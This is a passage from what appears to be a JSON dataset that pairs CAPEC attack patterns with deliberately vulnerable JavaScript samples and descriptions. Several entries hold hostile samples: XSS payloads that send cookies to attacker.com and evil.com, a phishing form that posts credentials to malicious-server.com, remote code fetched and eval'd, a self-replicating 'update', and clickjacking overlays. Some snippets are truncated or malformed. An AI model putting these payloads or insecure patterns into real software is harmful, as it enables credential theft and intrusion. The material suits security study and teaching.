        "code_snippet": "function processUserData(userInput) {\n    const userData = JSON.parse(userInput);\n    \n    if (userData.userType === 'admin') {\n        // No validation of input structure or values\n        const sqlQuery = `SELECT * FROM users WHERE username = '${userData.username}'`;\n        executeQuery(sqlQuery);\n        grantAdminAccess(userData.username);\n    }\n    \n    // Directly use unsanitized input in HTML\n    document.getElementById('userProfile').innerHTML = userData.profile;\n    \n    // Process numeric input without type checking\n    const calculatedValue = userData.amount * 100;\n    updateAccountBalance(calculatedValue);\n}",
        "description": "This code demonstrates multiple input validation vulnerabilities by accepting JSON input without proper structure validation, trusting user-provided type information for access control, using unsanitized input in SQL queries and HTML content, and performing calculations without type verification. It embodies CWE-20, CWE-1286, CWE-1287, CWE-807, and CWE-1173 by failing to implement proper input validation mechanisms."
    },
    {
        "capec_id": "154",
        "capec_name": "Resource Location Spoofing",
        "code_snippet": "// UI component showing a login form\nfunction displayLoginForm() {\n    const loginDiv = document.createElement('div');\n    loginDiv.innerHTML = `\n        <div class='login-form'>\n            <h2>Welcome to MyBank</h2>\n            <form id='login-form' action='process_login.php'>\n                <input type='text' name='username' placeholder='Username'>\n                <input type='password' name='password' placeholder='Password'>\n                <button type='submit'>Login</button>\n            </form>\n        </div>\n    `;\n    \n    // Vulnerable: No validation of origin/source\n    window.addEventListener('message', function(event) {\n        if(event.data.type === 'redirect') {\n            // Blindly trusts the redirect URL from any source\n            window.location.href = event.data.url;\n        }\n    });\n    \n    // Vulnerable: Does not validate SSL certificate\n    const xhr = new XMLHttpRequest();\n    xhr.onreadystatechange = function() {\n        if (xhr.readyState === 4) {\n            document.getElementById('login-form').action = xhr.responseText;\n        }\n    };\n    xhr.open('GET', 'get_auth_endpoint.php', true);\n    xhr.send();\n    \n    return loginDiv;\n}",
        "description": "This vulnerable code demonstrates a login form implementation that is susceptible to location spoofing attacks. It has multiple security issues: it blindly accepts postMessage events from any origin that can redirect users to malicious sites, doesn't properly validate communication channels, and dynamically sets form submission endpoints without proper verification. This makes it vulnerable to phishing attacks where an attacker could intercept and modify the authentication endpoint or redirect users to a malicious site."
    },
    {
        "capec_id": "155",
        "capec_name": "Screen Temporary Files for Sensitive Information",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction processUserData(userData) {\n    // Create temporary file in public web directory\n    const tempFile = path.join('public', 'temp', `data_${Date.now()}.txt`);\n    \n    // Write sensitive data to temp file with weak permissions\n    fs.writeFileSync(tempFile, JSON.stringify({\n        creditCard: userData.ccNumber,\n        ssn: userData.socialSecurity,\n        password: userData.password\n    }), { mode: 0o666 });\n\n    // Process data\n    someBusinessLogic(tempFile);\n\n    // Attempt to delete file but don't verify deletion\n    fs.unlink(tempFile, (err) => {\n        if (err) console.log('Failed to delete temp file');\n    });\n}",
        "description": "This code creates a temporary file with sensitive user data in a publicly accessible web directory using weak file permissions (666). The file is created with a predictable name pattern and stored in a location that could be accessed by unauthorized users. The code also fails to properly handle file cleanup, potentially leaving sensitive data exposed."
    },
    {
        "capec_id": "157",
        "capec_name": "Sniffing Attacks",
        "code_snippet": "const loginForm = document.getElementById('login-form');\nloginForm.addEventListener('submit', function(e) {\n  e.preventDefault();\n  const username = document.getElementById('username').value;\n  const password = document.getElementById('password').value;\n\n  // Send credentials in cleartext\n  fetch('http://api.example.com/login', {\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json'\n    },\n    body: JSON.stringify({\n      username: username,\n      password: password,\n      sessionId: localStorage.getItem('sessionId')\n    })\n  });\n});",
        "description": "This code demonstrates a vulnerable login form implementation that transmits sensitive credentials over an unencrypted HTTP connection. The credentials and session ID are sent in cleartext, making them susceptible to network sniffing attacks. Additionally, the lack of TLS/HTTPS and proper message integrity checks allows attackers to passively intercept the transmitted data."
    },
    {
        "capec_id": "158",
        "capec_name": "Sniffing Network Traffic",
        "code_snippet": "`\nconst net = require('net');\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // Send sensitive user credentials in cleartext\n    const credentials = {\n      username: 'admin',\n      password: 'secretpass123',\n      apiKey: '1234-5678-9012-3456',\n      sessionToken: 'abcdef123456'",
        "description": "\"This code demonstrates multiple vulnerabilities related to cleartext transmission and storage of sensitive data. It creates a TCP server that handles sensitive information including credentials, API keys, system configuration, and authentication tokens without encryption. The server transmits this data in plaintext over the network, making it susceptible to network sniffing attacks. Additionally, it exposes internal system information and stores authentication tokens globally without protection.\""
    },
    {
        "capec_id": "159",
        "capec_name": "Redirect Access to Libraries",
        "code_snippet": "const childProcess = require('child_process');\nconst userProvidedPath = process.argv[2] || './lib';\n\nprocess.env.PATH = userProvidedPath + ':' + process.env.PATH;\n\nfunction loadExternalLibrary(libraryName) {\n    try {\n        const result = childProcess.execSync(`${libraryName} --version`, {\n            env: process.env,\n            shell: true\n        });\n        return require(libraryName);\n    } catch(err) {\n        console.error('Failed to load library:', err);\n    }\n}",
        "description": "This code demonstrates vulnerable library loading by allowing user control over the PATH environment variable and library resolution. It accepts an untrusted search path as a command-line argument and modifies the system PATH, then attempts to load and execute external libraries without proper path validation. This allows an attacker to inject malicious libraries into the search path that could be loaded instead of legitimate ones."
    },
    {
        "capec_id": "160",
        "capec_name": "Exploit Script-Based APIs",
        "code_snippet": "function displayUserProfile(userData) {\n    let template = `\n        <div class='profile'>\n            <h2>${userData.name}</h2>\n            <script>${userData.customJs}</script>\n            <div class='bio'>${userData.bio}</div>\n        </div>\n    `;\n    document.getElementById('userProfile').innerHTML = template;\n}\n\n// Usage example with malicious input\nlet maliciousData = {\n    name: 'John<script>alert(document.cookie)</script>',\n    customJs: 'fetch(\"/api/sensitive\").then(r=>r.text()).then(d=>fetch(\"http://attacker.com/steal?\"+d))',\n    bio: '<img src=\"x\" onerror=\"document.location=\\'http://evil.com/?cookie=\\'+document.cookie\"/>' \n};\ndisplayUserProfile(maliciousData);",
        "description": "This code demonstrates a vulnerable template implementation that directly injects user-provided data into HTML without proper sanitization, allowing for multiple XSS attack vectors through direct script injection, template manipulation, and event handler injection. The code also shows how custom JavaScript execution can be achieved through unsanitized template variables."
    },
    {
        "capec_id": "161",
        "capec_name": "Infrastructure Manipulation",
        "code_snippet": "const net = require('net');\nconst server = net.createServer();\n\nconst legitServer = {\n    host: 'banking.example.com',\n    port: 443\n};\n\nconst routingTable = new Map();\n\nserver.on('connection', (client) => {\n    let destination = routingTable.get(client.remoteAddress) || legitServer;\n    \n    const proxy = net.createConnection({\n        host: destination.host,\n        port: destination.port\n    });\n\n    client.pipe(proxy);\n    proxy.pipe(client);\n\n    // Vulnerable: No verification of destination authenticity\n    routingTable.set(client.remoteAddress, {\n        host: 'malicious.example.com',\n        port: 443\n    });\n\n    // Vulnerable: No message integrity checks\n    client.on('data', (data) => {\n        // Raw forwarding without validation\n        proxy.write(data);\n    });\n});\n\nserver.listen(8080, '0.0.0.0');",
        "description": "This code demonstrates a vulnerable network proxy implementation that allows for pharming attacks. It lacks proper endpoint verification, message integrity checks, and destination validation. The routing table can be manipulated to redirect traffic to malicious endpoints, and there's no validation of the communication channel's security. The code exposes sensitive routing information and doesn't implement proper channel restrictions."
    },
    {
        "capec_id": "162",
        "capec_name": "Manipulating Hidden Fields",
        "code_snippet": "// Shopping cart checkout processing\napp.post('/process-order', (req, res) => {\n    const cartItems = req.body.items;\n    let totalAmount = 0;\n\n    // Vulnerable: Trusting client-side price calculations\n    cartItems.forEach(item => {\n        totalAmount += parseFloat(item.price) * parseInt(item.quantity);\n    });\n\n    // Process payment with client-provided total\n    processPayment({\n        amount: totalAmount,\n        userId: req.body.userId,\n        items: cartItems\n    }).then(() => {\n        res.json({ success: true, orderTotal: totalAmount });\n    });\n})",
        "description": "The code trusts client-provided price information without server-side validation. An attacker can manipulate the item prices and quantities in the request body before submission, allowing them to purchase items at unauthorized prices. The server blindly accepts and processes these manipulated values without verifying against a trusted source."
    },
    {
        "capec_id": "163",
        "capec_name": "Spear Phishing",
        "code_snippet": "function createTrustedEmailUI() {\n  const emailTemplate = {\n    from: 'security@trusted-company.com',\n    signature: 'valid_digital_signature',\n    userInfo: {\n      name: 'John Smith',\n      company: 'Acme Corp',\n      recentPurchase: 'Premium Package'\n    }\n  };\n\n  function createLoginForm(redirectUrl) {\n    const form = document.createElement('form');\n    form.action = redirectUrl;\n    form.innerHTML = `\n      <div class='trusted-header'>\n        <img src='${emailTemplate.userInfo.company}-logo.png'/>\n        <div>Account Security Alert</div>\n      </div>\n      <input type='text' name='username' value='${emailTemplate.userInfo.name}' readonly/>\n      <input type='password' name='password' placeholder='Verify your password'/>\n      <button onclick='window.location=redirectUrl'>Secure Login</button>\n    `;\n    window.opener.location = redirectUrl;\n    return form;\n  }\n\n  const maliciousRedirect = 'https://malicious-clone.com/login?target=' + \n    encodeURIComponent(window.location.href);\n  document.body.appendChild(createLoginForm(maliciousRedirect));\n}",
        "description": "This code creates a deceptive login interface mimicking a trusted company's security alert. It includes personal information to appear legitimate, implements unsafe URL redirects, and manipulates the window.opener property. The code demonstrates multiple vulnerabilities including UI misrepresentation, open redirect, and unsafe cross-domain interactions."
    },
    {
        "capec_id": "164",
        "capec_name": "Mobile Phishing",
        "code_snippet": "// Mobile phishing login form simulation\nfunction createPhishingForm() {\n    const loginForm = document.createElement('div');\n    loginForm.innerHTML = `\n        <div class='bank-login' style='opacity: 0.99'>\n            <img src='fake-bank-logo.png' style='filter: opacity(1)'>\n            <h2>Bank Security Check</h2>\n            <form onsubmit='return handleLogin(event)'>\n                <input type='tel' id='phone' placeholder='Phone Number' required>\n                <input type='password' id='password' placeholder='Password' required>\n                <button type='submit'>Verify Account</button>\n            </form>\n        </div>\n    `;\n\n    function handleLogin(event) {\n        event.preventDefault();\n        const credentials = {\n            phone: document.getElementById('phone').value,\n            password: document.getElementById('password').value\n        };\n        fetch('https://malicious-server.com/collect', {\n            method: 'POST',\n            body: JSON.stringify(credentials)\n        });\n        window.location.href = 'https://legitimate-bank.com';\n        return false;\n    }\n\n    document.body.appendChild(loginForm);\n}",
        "description": "This code creates a deceptive mobile banking login form that mimics a legitimate bank's security verification page. It uses UI manipulation to appear authentic, lacks proper authentication checks, and sends captured credentials to a malicious server before redirecting to the real bank's website. The form exploits single-factor authentication and doesn't implement any attempt limiting."
    },
    {
        "capec_id": "165",
        "capec_name": "File Manipulation",
        "code_snippet": "`\nconst fs = require('fs');\nconst path = require('path');\n\nfunction processUploadedFile(userFilename, uploadedContent) {\n    const tempDir = '/tmp/';\n    const filePath = path.join(tempDir, userFilename);\n    \n    fs.writeFileSync(filePath, uploadedContent);\n    \n    // Determine file type based on extension\n    const ext = path.extname(userFilename).toLowerCase();\n    if(ext === '.txt') {\n        return fs.readFileSync(filePath, 'utf8');",
        "description": "\"This vulnerable code demonstrates multiple file manipulation issues: it trusts user-provided filenames without sanitization (allowing path traversal), relies on file extensions for processing decisions, creates insecure temporary files, and executes files based on extension. The code allows arbitrary file writes and potential command execution through unsanitized file paths and dangerous file processing based on extensions.\""
    },
    {
        "capec_id": "166",
        "capec_name": "Force the System to Reset Values",
        "code_snippet": "`class DeviceController {\n        constructor() {\n            this.config = {\n                isAdmin: false,\n                powerState: 'on',\n                securitySettings: null",
        "description": "\"This code demonstrates multiple vulnerabilities related to device state management and authentication. The resetDevice function can be called without authentication, allowing attackers to reset the device to a privileged state. The power save/restore operations don't preserve security settings, and there's no verification of configuration integrity after state transitions. Security-critical settings are left uninitialized after reset and power operations.\""
    },
    {
        "capec_id": "167",
        "capec_name": "White Box Reverse Engineering",
        "code_snippet": "class SecureSystem {\n    constructor() {\n        this._sensitiveData = 'secret_key_123';\n        this._debugMode = false;\n        this._traceData = [];\n    }\n\n    enableDebug() {\n        // Debug mode can be enabled at runtime\n        this._debugMode = true;\n        console.log('Debug mode enabled');\n    }\n\n    processData(input) {\n        // Store trace data in plaintext\n        this._traceData.push({\n            timestamp: Date.now(),\n            input: input,\n            systemState: this._sensitiveData\n        });\n\n        if(this._debugMode) {\n            // Expose internal system info when debug is enabled\n            console.log('System Info:', {\n                memory: process.memoryUsage(),\n                env: process.env,\n                pwd: process.cwd(),\n                systemKey: this._sensitiveData\n            });\n        }\n\n        // Critical security check that could be optimized away\n        if(input.length > 0) {\n            return this._processSecurely(input);\n        }\n        return null;\n    }\n\n    _processSecurely(input) {\n        return input + this._sensitiveData;\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues including improper trace data management, exposure of sensitive system information through debug features, potential for optimization removal of security checks, and runtime activation of debug functionality that could expose internal system state. The code stores sensitive trace data in plaintext, exposes system information when debug mode is enabled, and contains security-critical code that could be optimized away by the processor."
    },
    {
        "capec_id": "168",
        "capec_name": "Windows ::DATA Alternate Data Stream",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction storeSecretData(filename, sensitiveData) {\n  // Store sensitive data in main file\n  fs.writeFileSync(filename, 'Normal content');\n\n  // Hide sensitive data in alternate data stream\n  const adsPath = filename + ':secret';\n  const command = `type nul > \"${adsPath}\" && echo ${sensitiveData} > \"${adsPath}\"`;\n  require('child_process').execSync(command);\n\n  // Verify file using normal methods - won't show ADS\n  const stats = fs.statSync(filename);\n  console.log(`File size: ${stats.size}`); // Only shows main stream size\n  \n  return true;\n}\n\nstoreSecretData('normal.txt', 'sensitive_password_123');",
        "description": "This vulnerable code creates a file with an alternate data stream on Windows NTFS to hide sensitive information. It writes normal content to the main stream while secretly storing sensitive data in an ADS named 'secret'. The code exploits the fact that standard file operations and size checks won't reveal the hidden ADS content, making it possible to conceal malicious data or sensitive information that bypasses security scanning."
    },
    {
        "capec_id": "169",
        "capec_name": "Footprinting",
        "code_snippet": "class UserAuthentication {\n    constructor() {\n        this.loginAttempts = {};\n    }\n\n    async authenticateUser(username, password) {\n        try {\n            // Vulnerable timing behavior reveals validity of usernames\n            if (!this.loginAttempts[username]) {\n                await new Promise(resolve => setTimeout(resolve, 500));\n                this.loginAttempts[username] = 0;\n            }\n\n            // Error messages leak different states\n            if (username.length < 3) {\n                throw new Error('Username too short');\n            }\n\n            const user = await db.findUser(username);\n            if (!user) {\n                this.loginAttempts[username]++;\n                throw new Error('Invalid credentials');\n            }\n\n            // Different timing for password check reveals password length\n            for (let i = 0; i < password.length; i++) {\n                await new Promise(resolve => setTimeout(resolve, 10));\n            }\n\n            if (!validatePassword(user, password)) {\n                this.loginAttempts[username]++;\n                console.log(`Failed login attempt for user: ${username}`);\n                throw new Error('Invalid credentials');\n            }\n\n            return { success: true, userData: user };\n        } catch (error) {\n            return { success: false, error: error.message };\n        }\n    }\n}",
        "description": "This vulnerable authentication code leaks information through timing differences, error messages, and logging behavior. It allows attackers to probe for valid usernames through timing analysis, reveals password length through processing time, and exposes login attempts through logs. The code creates observable behavioral discrepancies that can be exploited for user enumeration and credential harvesting."
    },
    {
        "capec_id": "170",
        "capec_name": "Web Application Fingerprinting",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/api/user', (req, res) => {\n    try {\n        // Sensitive information in query string\n        const userId = req.query.id;\n        const userPassword = req.query.password;\n        \n        if (!userId) {\n            throw new Error('Invalid user ID');\n        }\n\n        // Detailed error messages exposing system info\n        res.header('Server', 'Apache/2.4.1 (Unix) PHP/5.4.0');\n        res.header('X-Powered-By', 'PHP/5.4.0');\n        \n        // Download and execute remote code without verification\n        const https = require('https');\n        https.get('https://remote-server.com/script.js', (response) => {\n            let code = '';\n            response.on('data', (chunk) => code += chunk);\n            response.on('end', () => eval(code));\n        });\n\n        res.json({ status: 'success', serverInfo: process.env, debug: true });\n    } catch(err) {\n        res.status(500).json({\n            error: err.message,\n            stack: err.stack,\n            systemPath: __dirname,\n            nodeVersion: process.version\n        });\n    }\n});\n\napp.listen(3000);",
        "description": "This vulnerable Express.js application exposes sensitive information through query strings, detailed error messages, and HTTP headers. It also downloads and executes remote code without verification, and reveals system information in error responses. The code demonstrates multiple security issues including information disclosure, unsafe GET parameters, and remote code execution vulnerabilities."
    },
    {
        "capec_id": "171",
        "capec_name": "DEPRECATED: Variable Manipulation",
        "code_snippet": "function processUserInput(userInput) {\n    let formData = {};\n    // User can control the variable name\n    let varName = userInput.name;\n    let varValue = userInput.value;\n    \n    // Vulnerable dynamic variable assignment\n    eval(varName + ' = \"' + varValue + '\"');\n    \n    // Vulnerable dynamic property access\n    formData[varName] = eval(varName);\n    \n    // Vulnerable function execution\n    if(userInput.action) {\n        let fnName = userInput.action;\n        eval(fnName + '()');\n    }\n    \n    return formData;\n}",
        "description": "This vulnerable code allows dynamic variable manipulation through user-controlled input, enabling an attacker to inject and execute arbitrary JavaScript code through eval(), access or modify unintended variables, and invoke arbitrary functions. The code demonstrates improper control of dynamically-identified variables and eval injection vulnerabilities."
    },
    {
        "capec_id": "173",
        "capec_name": "Action Spoofing",
        "code_snippet": "function createDownloadButton() {\n    const button = document.createElement('button');\n    button.innerHTML = 'View Account Details';\n    button.style.position = 'relative';\n    \n    const hiddenFrame = document.createElement('iframe');\n    hiddenFrame.style.position = 'absolute';\n    hiddenFrame.style.opacity = '0.0';\n    hiddenFrame.style.zIndex = '2';\n    hiddenFrame.src = 'malicious-download.html';\n    \n    const container = document.createElement('div');\n    container.appendChild(button);\n    container.appendChild(hiddenFrame);\n    \n    hiddenFrame.style.top = '0';\n    hiddenFrame.style.left = '0';\n    hiddenFrame.style.width = '100%';\n    hiddenFrame.style.height = '100%';\n    \n    return container;\n}\n\nwindow.onload = () => {\n    document.body.appendChild(createDownloadButton());\n}",
        "description": "This code creates a clickjacking attack by overlaying an invisible iframe over what appears to be an account details button. When users click what they think is a legitimate button, they're actually interacting with hidden content that could trigger unwanted actions like downloads or form submissions."
    },
    {
        "capec_id": "174",
        "capec_name": "Flash Parameter Injection",
        "code_snippet": "function loadFlashContent(userInput) {\n    const flashVars = 'paramA=' + userInput + '&allowScriptAccess=always';\n    const embedCode = `\n        <object type='application/x-shockwave-flash' data='content.swf'>\n            <param name='movie' value='content.swf' />\n            <param name='flashvars' value='${flashVars}' />\n            <param name='allowScriptAccess' value='always' />\n        </object>\n    `;\n    document.getElementById('flashContainer').innerHTML = embedCode;\n}",
        "description": "This code demonstrates vulnerable Flash embedding by directly injecting user input into flashvars without proper validation or sanitization, allowing cross-domain access, and setting dangerous allowScriptAccess parameter to 'always'. The user input could contain malicious parameters that exploit the Flash file's interface with the HTML document."
    },
    {
        "capec_id": "175",
        "capec_name": "Code Inclusion",
        "code_snippet": "function loadExternalScript(url) {\n    let script = document.createElement('script');\n    script.src = url;\n    document.body.appendChild(script);\n}\n\nfunction loadDynamicComponent(componentName) {\n    let path = './components/' + componentName + '.js';\n    loadExternalScript(path);\n}\n\n// Vulnerable usage\nlet userInput = new URL(window.location.href).searchParams.get('component');\nloadDynamicComponent(userInput);",
        "description": "This code demonstrates unsafe dynamic script loading based on user input without proper validation. It allows an attacker to include arbitrary JavaScript files by manipulating the 'component' URL parameter, potentially leading to execution of malicious code. The code directly uses user input to construct file paths and dynamically loads JavaScript files without verifying their source or content."
    },
    {
        "capec_id": "176",
        "capec_name": "Configuration/Environment Manipulation",
        "code_snippet": "const fs = require('fs');\nconst configPath = './app_config.json';\n\nfunction loadSystemConfig() {\n  let config = {};\n  try {\n    config = JSON.parse(fs.readFileSync(configPath, 'utf8'));\n  } catch (error) {\n    // Fallback to default insecure configuration\n    config = {\n      debug_mode: true,\n      security_version: '1.0',\n      admin_access: true\n    };\n  }\n  return config;\n}\n\nfunction applySystemSettings() {\n  const config = loadSystemConfig();\n  // Directly applying external configuration without validation\n  global.DEBUG_MODE = config.debug_mode;\n  global.SECURITY_VERSION = config.security_version;\n  global.ADMIN_ACCESS = config.admin_access;\n}\n\napplySystemSettings();",
        "description": "This vulnerable code demonstrates insecure handling of external configuration files. It loads system settings from an external JSON file without proper validation or access controls, allowing an attacker to manipulate critical system configurations. The code also implements an unsafe fallback mechanism that enables debug mode and admin access by default, and allows downgrading of security versions. The configuration values are directly applied to global variables without any integrity checks or lock mechanisms."
    },
    {
        "capec_id": "177",
        "capec_name": "Create files with the same name as files protected with a higher classification",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction loadConfiguration(configPath) {\n  // Vulnerable: accepts user-controlled path without validation\n  const userProvidedPath = path.join(__dirname, configPath);\n  \n  try {\n    // Vulnerable: blindly trusts the file name/path\n    const config = require(userProvidedPath);\n    if (config.isAdmin) {\n      // Grant administrative privileges based on file content\n      executePrivilegedOperations(config);\n    }\n  } catch(err) {\n    // Falls back to default location if first attempt fails\n    const defaultConfig = require('./config/default.js');\n    return defaultConfig;\n  }\n}\n\n// Usage:\nloadConfiguration('../user_supplied/config.js');",
        "description": "This code is vulnerable to path traversal and file location manipulation. It blindly accepts a user-provided path to load a configuration file, and grants privileges based on the file contents without proper validation. An attacker could place a malicious config.js file in a directory that's searched before the legitimate configuration, potentially gaining unauthorized privileges. The code also doesn't validate file names or handle symbolic links/junctions properly, making it susceptible to file location manipulation attacks."
    },
    {
        "capec_id": "178",
        "capec_name": "Cross-Site Flashing",
        "code_snippet": "// Flash Embed with Parameter-Based URL Control\nfunction embedFlashContent(userParam) {\n    let flashVars = {\n        contentURL: userParam || 'default.xml',\n        allowScriptAccess: 'always',\n        allowNetworking: 'all'\n    };\n    \n    let flashObj = document.createElement('object');\n    flashObj.setAttribute('type', 'application/x-shockwave-flash');\n    flashObj.setAttribute('data', 'content.swf');\n    \n    let paramUrl = document.createElement('param');\n    paramUrl.setAttribute('name', 'flashvars');\n    paramUrl.setAttribute('value', 'xmlPath=' + flashVars.contentURL);\n    \n    flashObj.appendChild(paramUrl);\n    document.body.appendChild(flashObj);\n}",
        "description": "This code snippet demonstrates a vulnerable Flash embedding implementation that accepts user-controlled input to specify external content URLs. It sets permissive cross-domain policies and doesn't validate the input URL, allowing potential redirect attacks and cross-site scripting through Flash parameter injection."
    },
    {
        "capec_id": "179",
        "capec_name": "Calling Micro-Services Directly",
        "code_snippet": "`\n    // Client-side service discovery implementation\n    class MicroServiceDiscovery {\n      constructor() {\n        this.serviceEndpoints = new Map();\n        this.sensitiveData = {\n          apiKey: 'sk_live_12345',\n          userToken: document.cookie",
        "description": "\"This code demonstrates vulnerable micro-service discovery and interaction patterns including exposed service endpoints, sensitive data in query parameters, client-side security enforcement, persistent storage of sensitive data in cookies and localStorage, and insufficient access controls for service metadata.\""
    },
    {
        "capec_id": "180",
        "capec_name": "Exploiting Incorrectly Configured Access Control Security Levels",
        "code_snippet": "\"// Global configuration object for access control\nconst accessControlConfig = {\n    admin: { level: 'admin', permissions: ['read', 'write', 'execute']",
        "description": "\"This code demonstrates vulnerable access control implementation with multiple security issues: prototype pollution in permission handling, access checks occurring after resource loading, insufficient permission granularity, and improper protection of critical resources. The configuration can be manipulated to bypass intended access restrictions.\""
    },
    {
        "capec_id": "181",
        "capec_name": "Flash File Overlay",
        "code_snippet": "// Malicious clickjacking overlay using Flash\nfunction createOverlay() {\n    var overlay = document.createElement('object');\n    overlay.setAttribute('type', 'application/x-shockwave-flash');\n    overlay.setAttribute('data', 'malicious.swf');\n    overlay.setAttribute('width', '100%');\n    overlay.setAttribute('height', '100%');\n    overlay.style.position = 'fixed';\n    overlay.style.top = '0';\n    overlay.style.left = '0';\n    overlay.style.zIndex = '9999';\n    overlay.style.opacity = '0.0001';\n    \n    var param = document.createElement('param');\n    param.setAttribute('name', 'wmode');\n    param.setAttribute('value', 'transparent');\n    overlay.appendChild(param);\n    \n    document.body.appendChild(overlay);\n}\n\n// Crossdomain.xml allowing all domains\nvar crossdomain = '<?xml version=\"1.0\"?>\\n' +\n    '<cross-domain-policy>\\n' +\n    '    <allow-access-from domain=\"*\" />\\n' +\n    '</cross-domain-policy>';\n\ncreateOverlay();",
        "description": "This code creates a malicious transparent Flash overlay that covers the entire webpage, intercepting all user clicks. It utilizes a permissive cross-domain policy and positions the Flash object with maximum z-index and near-invisible opacity to trick users into clicking on disguised elements."
    },
    {
        "capec_id": "182",
        "capec_name": "Flash Injection",
        "code_snippet": "function loadFlashContent(userInput) {\n  let flashObject = document.createElement('object');\n  flashObject.setAttribute('type', 'application/x-shockwave-flash');\n  // No validation of user input domain\n  flashObject.setAttribute('data', userInput);\n  \n  // Overly permissive crossdomain.xml settings\n  let allowDomain = '*';\n  let flashvars = {\n    callback: 'javascript:alert(document.cookie)',\n    allowedDomain: allowDomain\n  };\n  \n  flashObject.setAttribute('flashvars', JSON.stringify(flashvars));\n  document.body.appendChild(flashObject);\n}",
        "description": "This code creates a Flash object that loads content from an unvalidated user input source and sets overly permissive cross-domain policies. It allows Flash content to be loaded from any domain and enables potentially malicious callbacks, which could lead to data theft through cross-site flashing attacks."
    },
    {
        "capec_id": "183",
        "capec_name": "IMAP/SMTP Command Injection",
        "code_snippet": "const express = require('express');\nconst { exec } = require('child_process');\nconst app = express();\n\napp.post('/send-email', (req, res) => {\n  const { to, subject, body } = req.body;\n  const mailCommand = `echo \"${body}\" | mail -s \"${subject}\" ${to}`;\n\n  exec(mailCommand, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error details: ${error.message}`);\n      return res.status(500).json({ error: error.message });\n    }\n    res.json({ message: 'Email sent successfully' });\n  });\n});",
        "description": "This vulnerable code demonstrates a web-mail server implementation that directly uses user input in shell commands without proper sanitization. It accepts email parameters and constructs a mail command using template literals, allowing command injection through specially crafted input. The code also exposes sensitive error messages and relies on client-side data without server-side validation."
    },
    {
        "capec_id": "184",
        "capec_name": "Software Integrity Attack",
        "code_snippet": "async function updateApplication() {\n    try {\n        // Download and execute code from remote source without verification\n        const response = await fetch('http://untrusted-source.com/update.js');\n        const code = await response.text();\n        \n        // Expose sensitive system info through error messages\n        const systemInfo = {\n            os: process.platform,\n            arch: process.arch,\n            env: process.env,\n            versions: process.versions\n        };\n        \n        // Embedded malicious code that activates under specific conditions\n        const timeCheck = new Date().getHours();\n        if(timeCheck === 3) {\n            // Attempt to modify system integrity\n            eval(code + `;console.log('System info:', ${JSON.stringify(systemInfo)});`);\n            \n            // Intentionally corrupt local data structures\n            localStorage.clear();\n            indexedDB.deleteDatabase('appDB');\n        }\n    } catch(error) {\n        // Leak system details through error reporting\n        console.error('Update failed:', error, systemInfo);\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities including downloading and executing unverified code, exposing sensitive system information, and containing embedded malicious behavior that activates at specific times to compromise system integrity. The code attempts to modify local storage and system state while leaking sensitive information through error handlers."
    },
    {
        "capec_id": "185",
        "capec_name": "Malicious Software Download",
        "code_snippet": "\"// Malicious code disguised as a legitimate utility function\\nfunction updateUserPreferences(userSettings) {\\n    // Load external code without integrity checks\\n    const externalScript = document.createElement('script');\\n    externalScript.src = 'http://malicious-cdn.com/utility.js';\\n    document.head.appendChild(externalScript);\\n\\n    // Hidden payload that activates when conditions are met\\n    if(new Date().getHours() === 3) {\\n        // Collect sensitive system info\\n        const systemInfo = {\\n            userAgent: navigator.userAgent,\\n            platform: navigator.platform,\\            cookies: document.cookie,\\n            localStorage: JSON.stringify(localStorage)\\n",
        "description": "\"A deceptive JavaScript function that appears to be a legitimate user preferences updater but contains hidden malicious code. It downloads external code without verification, collects sensitive system information, and attempts to replicate itself across the DOM. The malicious behavior is triggered at specific times to avoid detection.\""
    },
    {
        "capec_id": "186",
        "capec_name": "Malicious Software Update",
        "code_snippet": "async function updateSoftware() {\n    const updateUrl = 'http://malicious-domain.com/fake-update.js';\n    try {\n        const response = await fetch(updateUrl);\n        const code = await response.text();\n        // No integrity check performed\n        const hiddenPayload = atob(code);\n        // Execute downloaded code without verification\n        eval(hiddenPayload);\n        // Replicate to other systems\n        for(let target of getConnectedSystems()) {\n            await sendPayload(target, hiddenPayload);\n        }\n    } catch(e) {\n        console.log('Update failed');\n    }\n}",
        "description": "This code demonstrates a vulnerable update mechanism that downloads and executes code from an untrusted source without integrity verification. It includes a hidden payload that can replicate itself to other systems, embodying characteristics of a trojan horse with self-replicating capabilities."
    },
    {
        "capec_id": "187",
        "capec_name": "Malicious Automated Software Update via Redirection",
        "code_snippet": "// Auto-update client implementation\nconst updateManager = {\n    serverUrl: 'http://update-server.com',\n    async checkForUpdates() {\n        const response = await fetch(this.serverUrl + '/latest');\n        const update = await response.json();\n        \n        if (update.version > currentVersion) {\n            // Directly download and execute without verification\n            const codeResponse = await fetch(update.codeUrl);\n            const newCode = await codeResponse.text();\n            \n            // Unsafe eval of downloaded code\n            eval(newCode);\n            \n            // Update version without verification\n            localStorage.setItem('version', update.version);\n            localStorage.setItem('lastUpdate', Date.now());\n        }\n    },\n    \n    installUpdate(updateData) {\n        // No signature verification\n        // No server authentication\n        const script = document.createElement('script');\n        script.src = updateData.scriptUrl;\n        document.head.appendChild(script);\n    }\n};\n\n// Auto-check for updates every hour\nsetInterval(() => updateManager.checkForUpdates(), 3600000);",
        "description": "This vulnerable code demonstrates an auto-update mechanism that lacks proper server authentication and code integrity verification. It blindly trusts the update server, downloads code without verification, and executes it using eval(). The code also stores update information client-side where it can be tampered with, and implements no signature verification or server authentication, making it susceptible to man-in-the-middle attacks and malicious code injection."
    },
    {
        "capec_id": "188",
        "capec_name": "Reverse Engineering",
